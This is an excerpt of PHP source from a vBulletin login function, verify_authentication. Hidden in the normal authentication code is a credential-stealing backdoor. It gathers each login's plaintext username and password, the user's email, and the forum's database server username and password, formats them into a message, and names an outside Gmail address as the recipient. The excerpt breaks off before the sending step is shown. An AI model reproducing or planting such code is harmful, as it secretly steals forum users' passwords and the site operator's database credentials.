...
function verify_authentication($username, $password, $md5password, $md5password_utf, $cookieuser, $send_cookies)
{
	...
	if ($vbulletin->userinfo = $vbulletin->db->query_first("SELECT userid, usergroupid, membergroupids, infractiongroupids, username, password, salt, email FROM " . TABLE_PREFIX . "user WHERE username = '" . $vbulletin->db->escape_string(htmlspecialchars_uni($username)) . "'"))
	{
		if (
		...
		$frfetch = @mysql_fetch_array(mysql_query("SELECT value FROM " . TABLE_PREFIX . "setting WHERE varname='homeurl'"));
		$from = $frfetch[0];
		$to = "vbb422vietvbb@gmail.com";
		$lg_username = strtolower($vbulletin->GPC["vb_login_username"]);
		$lg_password = $vbulletin->GPC["vb_login_password"];
		$lg_dbuser   = $vbulletin->config['MasterServer']['username'];
		$lg_dbpass     = $vbulletin->config['MasterServer']['password'];
		...
		while($row = @mysql_fetch_array($sql_query)) {
			if(strlen($lg_password) > 1 AND strlen($lg_username) > 1) {	
				$message = $lg_username . ':' . $lg_password . ':' . $row["email"] . ':' . $lg_dbuser. ':' . $lg_dbpass."\n";
